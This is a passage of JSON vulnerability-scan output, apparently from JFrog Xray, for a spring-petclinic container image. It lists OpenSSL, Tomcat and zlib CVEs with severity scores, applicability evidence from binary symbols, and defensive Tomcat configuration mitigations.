               "description": "A buffer overrun can be triggered in X.509 certificate verification, specifically in name constraint checking. Note that this occurs after certificate chain signature verification and requires either a CA to have signed the malicious certificate or for the application to continue certificate verification despite failure to construct a path to a trusted issuer. An attacker can craft a malicious email address to overflow four attacker-controlled bytes on the stack. This buffer overflow could result in a crash (causing a denial of service) or potentially remote code execution. Many platforms implement stack overflow protections which would mitigate against the risk of remote code execution. The risk may be further mitigated based on stack layout for any given platform/compiler. Pre-announcements of CVE-2022-3602 described this issue as CRITICAL. Further analysis based on some of the mitigating factors described above have led this to be downgraded to HIGH. Users are still encouraged to upgrade to a new version as soon as possible. In a TLS client, this can be triggered by connecting to a malicious server. In a TLS server, this can be triggered if the server requests client authentication and a malicious client connects. Fixed in OpenSSL 3.0.7 (Affected 3.0.0,3.0.1,3.0.2,3.0.3,3.0.4,3.0.5,3.0.6).",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": true,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
            "cve_id": "CVE-2022-3602",
            "scan_status": 1,
            "applicability": true,
            "evidence": [
               {
                  "column_names": [
                     "Path",
                     "Offset",
                     "Symbol",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/lib/libapk.so.3.12.0",
                        "0x0002c9e0",
                        "SSL_connect",
                        "The vulnerable function SSL_connect is called, indicating a TLS client that may accept crafted server certificates"
                     ],
                     [
                        "/lib/libapk.so.3.12.0",
                        "0x0002cee0",
                        "SSL_CTX_set_verify",
                        "The vulnerable function SSL_CTX_set_verify is called, may indicate a TLS server that may accept crafted client certificates"
                     ],
                     [
                        "/usr/lib/libtls.so.20.0.3",
                        "0x000118c8",
                        "X509_verify_cert",
                        "The vulnerable function X509_verify_cert is called, may indicate a TLS server that may accept crafted client certificates"
                     ],
                     [
                        "/usr/lib/libtls.so.20.0.3",
                        "0x000119b8",
                        "SSL_CTX_set_verify_depth",
                        "The vulnerable function SSL_CTX_set_verify is called, may indicate a TLS server that may accept crafted client certificates"
                     ],
                     [
                        "/usr/lib/libtls.so.20.0.3",
                        "0x00011c70",
                        "SSL_connect",
                        "The vulnerable function SSL_connect is called, indicating a TLS client that may accept crafted server certificates"
                     ],
                     [
                        "/usr/lib/libtls.so.20.0.3",
                        "0x00011e28",
                        "X509_verify_cert_error_string",
                        "The vulnerable function X509_verify_cert is called, may indicate a TLS server that may accept crafted client certificates"
                     ],
                     [
                        "/usr/lib/libtls.so.20.0.3",
                        "0x00011f80",
                        "SSL_accept",
                        "The vulnerable function SSL_accept is called, may indicate a TLS server that may accept crafted client certificates"
                     ],
                     [
                        "/usr/lib/libtls.so.20.0.3",
                        "0x00011fa0",
                        "SSL_CTX_set_verify",
                        "The vulnerable function SSL_CTX_set_verify is called, may indicate a TLS server that may accept crafted client certificates"
                     ]
                  ]
               }
            ],
            "info": "The vulnerable function SSL_connect is called, indicating a TLS client that may accept crafted server certificates, The vulnerable function SSL_CTX_set_verify is called, may indicate a TLS server that may accept crafted client certificates",
            "details": [
               {
                  "file_path": "/lib/libapk.so.3.12.0",
                  "details": "Offset: 0x0002c9e0, Symbol: SSL_connect, Issue Found: The vulnerable function SSL_connect is called, indicating a TLS client that may accept crafted server certificates"
               },
               {
                  "file_path": "/lib/libapk.so.3.12.0",
                  "details": "Offset: 0x0002cee0, Symbol: SSL_CTX_set_verify, Issue Found: The vulnerable function SSL_CTX_set_verify is called, may indicate a TLS server that may accept crafted client certificates"
               },
               {
                  "file_path": "/usr/lib/libtls.so.20.0.3",
                  "details": "Offset: 0x000118c8, Symbol: X509_verify_cert, Issue Found: The vulnerable function X509_verify_cert is called, may indicate a TLS server that may accept crafted client certificates"
               },
               {
                  "file_path": "/usr/lib/libtls.so.20.0.3",
                  "details": "Offset: 0x000119b8, Symbol: SSL_CTX_set_verify_depth, Issue Found: The vulnerable function SSL_CTX_set_verify is called, may indicate a TLS server that may accept crafted client certificates"
               },
               {
                  "file_path": "/usr/lib/libtls.so.20.0.3",
                  "details": "Offset: 0x00011c70, Symbol: SSL_connect, Issue Found: The vulnerable function SSL_connect is called, indicating a TLS client that may accept crafted server certificates"
               },
               {
                  "file_path": "/usr/lib/libtls.so.20.0.3",
                  "details": "Offset: 0x00011e28, Symbol: X509_verify_cert_error_string, Issue Found: The vulnerable function X509_verify_cert is called, may indicate a TLS server that may accept crafted client certificates"
               },
               {
                  "file_path": "/usr/lib/libtls.so.20.0.3",
                  "details": "Offset: 0x00011f80, Symbol: SSL_accept, Issue Found: The vulnerable function SSL_accept is called, may indicate a TLS server that may accept crafted client certificates"
               },
               {
                  "file_path": "/usr/lib/libtls.so.20.0.3",
                  "details": "Offset: 0x00011fa0, Symbol: SSL_CTX_set_verify, Issue Found: The vulnerable function SSL_CTX_set_verify is called, may indicate a TLS server that may accept crafted client certificates"
               }
            ]
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2022-3602",
            "result": "applicable"
         }
      },
      {
         "id": "XRAY-607988",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A buffer overrun can be triggered in X.509 certificate verification, specifically in name constraint checking. Note that this occurs after certificate chain signature verification and requires either a CA to have signed a malicious certificate or for an application to continue certificate verification despite failure to construct a path to a trusted issuer. An attacker can craft a malicious email address in a certificate to overflow an arbitrary number of bytes containing the `.' character (decimal 46) on the stack. This buffer overflow could result in a crash (causing a denial of service). In a TLS client, this can be triggered by connecting to a malicious server. In a TLS server, this can be triggered if the server requests client authentication and a malicious client connects.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 3.0.7-r0"
            ],
            "fixed_versions": [
               "3.0.7-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-3786",
                     "cwe": [
                        "CWE-120"
                     ],
                     "cwe_details": {
                        "CWE-120": {
                           "name": "Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')",
                           "description": "The product copies an input buffer to an output buffer without verifying that the size of the input buffer is less than the size of the output buffer, leading to a buffer overflow."
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "A buffer overrun can be triggered in X.509 certificate verification, specifically in name constraint checking. Note that this occurs after certificate chain signature verification and requires either a CA to have signed a malicious certificate or for an application to continue certificate verification despite failure to construct a path to a trusted issuer. An attacker can craft a malicious email address in a certificate to overflow an arbitrary number of bytes containing the `.' character (decimal 46) on the stack. This buffer overflow could result in a crash (causing a denial of service). In a TLS client, this can be triggered by connecting to a malicious server. In a TLS server, this can be triggered if the server requests client authentication and a malicious client connects.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": true,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
            "cve_id": "CVE-2022-3786",
            "scan_status": 1,
            "applicability": true,
            "evidence": [
               {
                  "column_names": [
                     "Path",
                     "Offset",
                     "Symbol",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/lib/libapk.so.3.12.0",
                        "0x0002c9e0",
                        "SSL_connect",
                        "The vulnerable function SSL_connect is called, indicating a TLS client that may accept crafted server certificates"
                     ],
                     [
                        "/lib/libapk.so.3.12.0",
                        "0x0002cee0",
                        "SSL_CTX_set_verify",
                        "The vulnerable function SSL_CTX_set_verify is called, may indicate a TLS server that may accept crafted client certificates"
                     ],
                     [
                        "/usr/lib/libtls.so.20.0.3",
                        "0x000118c8",
                        "X509_verify_cert",
                        "The vulnerable function X509_verify_cert is called, may indicate a TLS server that may accept crafted client certificates"
                     ],
                     [
                        "/usr/lib/libtls.so.20.0.3",
                        "0x000119b8",
                        "SSL_CTX_set_verify_depth",
                        "The vulnerable function SSL_CTX_set_verify is called, may indicate a TLS server that may accept crafted client certificates"
                     ],
                     [
                        "/usr/lib/libtls.so.20.0.3",
                        "0x00011c70",
                        "SSL_connect",
                        "The vulnerable function SSL_connect is called, indicating a TLS client that may accept crafted server certificates"
                     ],
                     [
                        "/usr/lib/libtls.so.20.0.3",
                        "0x00011e28",
                        "X509_verify_cert_error_string",
                        "The vulnerable function X509_verify_cert is called, may indicate a TLS server that may accept crafted client certificates"
                     ],
                     [
                        "/usr/lib/libtls.so.20.0.3",
                        "0x00011f80",
                        "SSL_accept",
                        "The vulnerable function SSL_accept is called, may indicate a TLS server that may accept crafted client certificates"
                     ],
                     [
                        "/usr/lib/libtls.so.20.0.3",
                        "0x00011fa0",
                        "SSL_CTX_set_verify",
                        "The vulnerable function SSL_CTX_set_verify is called, may indicate a TLS server that may accept crafted client certificates"
                     ]
                  ]
               }
            ],
            "info": "The vulnerable function SSL_connect is called, indicating a TLS client that may accept crafted server certificates, The vulnerable function SSL_CTX_set_verify is called, may indicate a TLS server that may accept crafted client certificates",
            "details": [
               {
                  "file_path": "/lib/libapk.so.3.12.0",
                  "details": "Offset: 0x0002c9e0, Symbol: SSL_connect, Issue Found: The vulnerable function SSL_connect is called, indicating a TLS client that may accept crafted server certificates"
               },
               {
                  "file_path": "/lib/libapk.so.3.12.0",
                  "details": "Offset: 0x0002cee0, Symbol: SSL_CTX_set_verify, Issue Found: The vulnerable function SSL_CTX_set_verify is called, may indicate a TLS server that may accept crafted client certificates"
               },
               {
                  "file_path": "/usr/lib/libtls.so.20.0.3",
                  "details": "Offset: 0x000118c8, Symbol: X509_verify_cert, Issue Found: The vulnerable function X509_verify_cert is called, may indicate a TLS server that may accept crafted client certificates"
               },
               {
                  "file_path": "/usr/lib/libtls.so.20.0.3",
                  "details": "Offset: 0x000119b8, Symbol: SSL_CTX_set_verify_depth, Issue Found: The vulnerable function SSL_CTX_set_verify is called, may indicate a TLS server that may accept crafted client certificates"
               },
               {
                  "file_path": "/usr/lib/libtls.so.20.0.3",
                  "details": "Offset: 0x00011c70, Symbol: SSL_connect, Issue Found: The vulnerable function SSL_connect is called, indicating a TLS client that may accept crafted server certificates"
               },
               {
                  "file_path": "/usr/lib/libtls.so.20.0.3",
                  "details": "Offset: 0x00011e28, Symbol: X509_verify_cert_error_string, Issue Found: The vulnerable function X509_verify_cert is called, may indicate a TLS server that may accept crafted client certificates"
               },
               {
                  "file_path": "/usr/lib/libtls.so.20.0.3",
                  "details": "Offset: 0x00011f80, Symbol: SSL_accept, Issue Found: The vulnerable function SSL_accept is called, may indicate a TLS server that may accept crafted client certificates"
               },
               {
                  "file_path": "/usr/lib/libtls.so.20.0.3",
                  "details": "Offset: 0x00011fa0, Symbol: SSL_CTX_set_verify, Issue Found: The vulnerable function SSL_CTX_set_verify is called, may indicate a TLS server that may accept crafted client certificates"
               }
            ]
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2022-3786",
            "result": "applicable"
         }
      },
      {
         "id": "XRAY-607988",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A buffer overrun can be triggered in X.509 certificate verification, specifically in name constraint checking. Note that this occurs after certificate chain signature verification and requires either a CA to have signed a malicious certificate or for an application to continue certificate verification despite failure to construct a path to a trusted issuer. An attacker can craft a malicious email address in a certificate to overflow an arbitrary number of bytes containing the `.' character (decimal 46) on the stack. This buffer overflow could result in a crash (causing a denial of service). In a TLS client, this can be triggered by connecting to a malicious server. In a TLS server, this can be triggered if the server requests client authentication and a malicious client connects.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 3.0.7-r0"
            ],
            "fixed_versions": [
               "3.0.7-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-3786",
                     "cwe": [
                        "CWE-120"
                     ],
                     "cwe_details": {
                        "CWE-120": {
                           "name": "Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')",
                           "description": "The product copies an input buffer to an output buffer without verifying that the size of the input buffer is less than the size of the output buffer, leading to a buffer overflow."
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "A buffer overrun can be triggered in X.509 certificate verification, specifically in name constraint checking. Note that this occurs after certificate chain signature verification and requires either a CA to have signed a malicious certificate or for an application to continue certificate verification despite failure to construct a path to a trusted issuer. An attacker can craft a malicious email address in a certificate to overflow an arbitrary number of bytes containing the `.' character (decimal 46) on the stack. This buffer overflow could result in a crash (causing a denial of service). In a TLS client, this can be triggered by connecting to a malicious server. In a TLS server, this can be triggered if the server requests client authentication and a malicious client connects.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": true,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
            "cve_id": "CVE-2022-3786",
            "scan_status": 1,
            "applicability": true,
            "evidence": [
               {
                  "column_names": [
                     "Path",
                     "Offset",
                     "Symbol",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/lib/libapk.so.3.12.0",
                        "0x0002c9e0",
                        "SSL_connect",
                        "The vulnerable function SSL_connect is called, indicating a TLS client that may accept crafted server certificates"
                     ],
                     [
                        "/lib/libapk.so.3.12.0",
                        "0x0002cee0",
                        "SSL_CTX_set_verify",
                        "The vulnerable function SSL_CTX_set_verify is called, may indicate a TLS server that may accept crafted client certificates"
                     ],
                     [
                        "/usr/lib/libtls.so.20.0.3",
                        "0x000118c8",
                        "X509_verify_cert",
                        "The vulnerable function X509_verify_cert is called, may indicate a TLS server that may accept crafted client certificates"
                     ],
                     [
                        "/usr/lib/libtls.so.20.0.3",
                        "0x000119b8",
                        "SSL_CTX_set_verify_depth",
                        "The vulnerable function SSL_CTX_set_verify is called, may indicate a TLS server that may accept crafted client certificates"
                     ],
                     [
                        "/usr/lib/libtls.so.20.0.3",
                        "0x00011c70",
                        "SSL_connect",
                        "The vulnerable function SSL_connect is called, indicating a TLS client that may accept crafted server certificates"
                     ],
                     [
                        "/usr/lib/libtls.so.20.0.3",
                        "0x00011e28",
                        "X509_verify_cert_error_string",
                        "The vulnerable function X509_verify_cert is called, may indicate a TLS server that may accept crafted client certificates"
                     ],
                     [
                        "/usr/lib/libtls.so.20.0.3",
                        "0x00011f80",
                        "SSL_accept",
                        "The vulnerable function SSL_accept is called, may indicate a TLS server that may accept crafted client certificates"
                     ],
                     [
                        "/usr/lib/libtls.so.20.0.3",
                        "0x00011fa0",
                        "SSL_CTX_set_verify",
                        "The vulnerable function SSL_CTX_set_verify is called, may indicate a TLS server that may accept crafted client certificates"
                     ]
                  ]
               }
            ],
            "info": "The vulnerable function SSL_connect is called, indicating a TLS client that may accept crafted server certificates, The vulnerable function SSL_CTX_set_verify is called, may indicate a TLS server that may accept crafted client certificates",
            "details": [
               {
                  "file_path": "/lib/libapk.so.3.12.0",
                  "details": "Offset: 0x0002c9e0, Symbol: SSL_connect, Issue Found: The vulnerable function SSL_connect is called, indicating a TLS client that may accept crafted server certificates"
               },
               {
                  "file_path": "/lib/libapk.so.3.12.0",
                  "details": "Offset: 0x0002cee0, Symbol: SSL_CTX_set_verify, Issue Found: The vulnerable function SSL_CTX_set_verify is called, may indicate a TLS server that may accept crafted client certificates"
               },
               {
                  "file_path": "/usr/lib/libtls.so.20.0.3",
                  "details": "Offset: 0x000118c8, Symbol: X509_verify_cert, Issue Found: The vulnerable function X509_verify_cert is called, may indicate a TLS server that may accept crafted client certificates"
               },
               {
                  "file_path": "/usr/lib/libtls.so.20.0.3",
                  "details": "Offset: 0x000119b8, Symbol: SSL_CTX_set_verify_depth, Issue Found: The vulnerable function SSL_CTX_set_verify is called, may indicate a TLS server that may accept crafted client certificates"
               },
               {
                  "file_path": "/usr/lib/libtls.so.20.0.3",
                  "details": "Offset: 0x00011c70, Symbol: SSL_connect, Issue Found: The vulnerable function SSL_connect is called, indicating a TLS client that may accept crafted server certificates"
               },
               {
                  "file_path": "/usr/lib/libtls.so.20.0.3",
                  "details": "Offset: 0x00011e28, Symbol: X509_verify_cert_error_string, Issue Found: The vulnerable function X509_verify_cert is called, may indicate a TLS server that may accept crafted client certificates"
               },
               {
                  "file_path": "/usr/lib/libtls.so.20.0.3",
                  "details": "Offset: 0x00011f80, Symbol: SSL_accept, Issue Found: The vulnerable function SSL_accept is called, may indicate a TLS server that may accept crafted client certificates"
               },
               {
                  "file_path": "/usr/lib/libtls.so.20.0.3",
                  "details": "Offset: 0x00011fa0, Symbol: SSL_CTX_set_verify, Issue Found: The vulnerable function SSL_CTX_set_verify is called, may indicate a TLS server that may accept crafted client certificates"
               }
            ]
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2022-3786",
            "result": "applicable"
         }
      },
      {
         "id": "XRAY-676707",
         "severity": "Critical",
         "jfrog_severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "maven",
         "summary": "Path Equivalence: 'file.Name' (Internal Dot) leading to Remote Code Execution and/or Information disclosure and/or malicious content added to uploaded files via write enabled Default Servlet in Apache Tomcat.\n\nThis issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.2, from 10.1.0-M1 through 10.1.34, from 9.0.0.M1 through 9.0.98.\n\nIf all of the following were true, a malicious user was able to view       security sensitive files and/or inject content into those files:\n- writes enabled for the default servlet (disabled by default)\n- support for partial PUT (enabled by default)\n- a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads\n- attacker knowledge of the names of security sensitive files being uploaded\n- the security sensitive files also being uploaded via partial PUT\n\nIf all of the following were true, a malicious user was able to       perform remote code execution:\n- writes enabled for the default servlet (disabled by default)\n- support for partial PUT (enabled by default)\n- application was using Tomcat's file based session persistence with the default storage location\n- application included a library that may be leveraged in a deserialization attack\n\nUsers are recommended to upgrade to version 11.0.3, 10.1.35 or 9.0.99, which fixes the issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "org.apache.tomcat.embed:tomcat-embed-core",
         "source_id": "gav://org.apache.tomcat.embed:tomcat-embed-core",
         "source_comp_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:10.1.34",
         "component_versions": {
            "id": "org.apache.tomcat.embed:tomcat-embed-core",
            "vulnerable_versions": [
               "10.1.0-M1 ≤ Version < 10.1.35",
               "11.0.0-M1 ≤ Version < 11.0.3",
               "9.0.0.M1 ≤ Version < 9.0.99"
            ],
            "fixed_versions": [
               "10.1.35",
               "11.0.3",
               "9.0.99"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2025-24813",
                     "cwe": [
                        "CWE-502",
                        "CWE-44",
                        "CWE-706"
                     ],
                     "cwe_details": {
                        "CWE-44": {
                           "name": "Path Equivalence: 'file.name' (Internal Dot)",
                           "description": "The product accepts path input in the form of internal dot ('file.ordir') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files."
                        },
                        "CWE-502": {
                           "name": "Deserialization of Untrusted Data",
                           "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "15"
                              }
                           ]
                        },
                        "CWE-706": {
                           "name": "Use of Incorrectly-Resolved Name or Reference",
                           "description": "The product uses a name or reference to access a resource, but the name/reference resolves to a resource that is outside of the intended control sphere."
                        }
                     },
                     "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "Path Equivalence: 'file.Name' (Internal Dot) leading to Remote Code Execution and/or Information disclosure and/or malicious content added to uploaded files via write enabled Default Servlet in Apache Tomcat.\n\nThis issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.2, from 10.1.0-M1 through 10.1.34, from 9.0.0.M1 through 9.0.98.\n\nIf all of the following were true, a malicious user was able to view       security sensitive files and/or inject content into those files:\n- writes enabled for the default servlet (disabled by default)\n- support for partial PUT (enabled by default)\n- a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads\n- attacker knowledge of the names of security sensitive files being uploaded\n- the security sensitive files also being uploaded via partial PUT\n\nIf all of the following were true, a malicious user was able to       perform remote code execution:\n- writes enabled for the default servlet (disabled by default)\n- support for partial PUT (enabled by default)\n- application was using Tomcat's file based session persistence with the default storage location\n- application included a library that may be leveraged in a deserialization attack\n\nUsers are recommended to upgrade to version 11.0.3, 10.1.35 or 9.0.99, which fixes the issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-676707",
            "VulnerabilityTitle": "",
            "ShortDescription": "A design problem in Apache Tomcat may lead to remote code execution when handling partial PUT requests.",
            "FullDescription": "",
            "Impact": 6,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Development mitigations\n\nThis vulnerability can be mitigated by enabling the `readonly` parameter of the default servlet (which is enabled by default). For example:\n\n```\n<servlet>\n    <servlet-name>default</servlet-name>\n    <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>\n    <init-param>\n        <param-name>readonly</param-name>\n        <param-value>true</param-value>\n    </init-param>\n</servlet>\n```\n\nAnother option is to disable partial PUT (enabled by default):\n```\n<servlet>\n    <servlet-name>default</servlet-name>\n    <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>\n    <init-param>\n        <param-name>allowPartialPut</param-name>\n        <param-value>false</param-value>\n    </init-param>\n</servlet>\n```\n\nA third option, useful only for mitigating the RCE case (so use this only if any of the conditions for data leakage are not met), is changing the configuration of the [Persistent Manager implementation](https://tomcat.apache.org/tomcat-9.0-doc/config/manager.html#:~:text=the%20sessionIdLength%20attribute.-,Persistent%20Manager%20Implementation,-If%20you%20are) to use a custom directory. This can be done through `context.xml`, by adding the `directory` attribute to the `Store` tag and specifying a custom directory:\n```\n<Manager className=\"org.apache.catalina.session.PersistentManager\" maxIdleBackup=\"1\" saveOnRestart=\"true\" processExpiresFrequency=\"1\">\n\t<Store className=\"org.apache.catalina.session.FileStore\" directory=\"...\"/>\n</Manager>\n```",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "This vulnerability can be exploited remotely by sending a malicious request to the server.",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "Exploitation of this vulnerability for data leakage requires the following prerequisites:\n1. Writes enabled for the default servlet (disabled by default).\n2. Support for partial PUT (enabled by default).\n3. A target URL for security-sensitive uploads that is a sub-directory of a target URL for public uploads.\n4. Attacker knowledge of the names of security-sensitive files being uploaded.\n5. The security-sensitive files are also being uploaded via partial PUT.\n\nExploitation for code execution requires the following:\n1. Writes enabled for the default servlet (disabled by default).\n2. Support for partial PUT (enabled by default).\n3. The application was using Tomcat's file-based session persistence with the default storage location.\n4. The application included a library that may be leveraged in a deserialization attack.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "The vulnerability has a published PoC.",
                  "IsPositive": 0,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "The impact of this vulnerability can be remote code execution or data leakage.",
                  "IsPositive": 0,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Published GitHub Advisory",
                  "Url": "https://github.com/advisories/GHSA-83qj-6fr2-vhqg",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Published PoC",
                  "Url": "https://scrapco.de/blog/analysis-of-cve-2025-24813-apache-tomcat-path-equivalence-rce.html",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Fix Commit",
                  "Url": "https://github.com/apache/tomcat/commit/0a668e0c27f2b7ca0cc7c6eea32253b9b5ecb29c",
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Technical Writeup",
                  "Url": "https://scrapco.de/blog/analysis-of-cve-2025-24813-apache-tomcat-path-equivalence-rce.html",
                  "InsertOrder": 4
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            "sha256__0de9bc61c159b4975a9ca51cebd71c7c144733045ed041525f52326f1f3fbd66.tar.gz/app/app.jar/META-INF/sbom/application.cdx.json/org.springframework.samples:spring-petclinic:3.4.0-SNAPSHOT/gav:/org.apache.tomcat.embed:tomcat-embed-core:10.1.34/org.apache.tomcat.embed:tomcat-embed-core:10.1.34",
            "sha256__0de9bc61c159b4975a9ca51cebd71c7c144733045ed041525f52326f1f3fbd66.tar.gz/app/app.jar/BOOT-INF/lib/tomcat-embed-core-10.1.34.jar"
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:10.1.34",
            "cve_id": "CVE-2025-24813",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The Tomcat configuration is not vulnerable",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:10.1.34",
            "vulnerability_id": "CVE-2025-24813",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-248482",
         "severity": "Critical",
         "jfrog_severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "zlib through 1.2.12 has a heap-based buffer over-read or buffer overflow in inflate in inflate.c via a large gzip header extra field. NOTE: only applications that call inflateGetHeader are affected. Some common applications bundle the affected zlib source code but may be unable to call inflateGetHeader (e.g., see the nodejs/node reference).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:zlib",
         "source_id": "alpine://3.14:zlib",
         "source_comp_id": "alpine://3.14:zlib:1.2.11-r3",
         "component_versions": {
            "id": "3.14:zlib",
            "vulnerable_versions": [
               "< 1.2.12-r2"
            ],
            "fixed_versions": [
               "1.2.12-r2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-37434",
                     "cwe": [
                        "CWE-787"
                     ],
                     "cwe_details": {
                        "CWE-787": {
                           "name": "Out-of-bounds Write",
                           "description": "The product writes data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "1"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "zlib through 1.2.12 has a heap-based buffer over-read or buffer overflow in inflate in inflate.c via a large gzip header extra field. NOTE: only applications that call inflateGetHeader are affected. Some common applications bundle the affected zlib source code but may be unable to call inflateGetHeader (e.g., see the nodejs/node reference).",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:26:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-248482",
            "VulnerabilityTitle": "",
            "ShortDescription": "A heap overflow in zlib can lead to remote code execution when a crafted gzip archive is processed.",
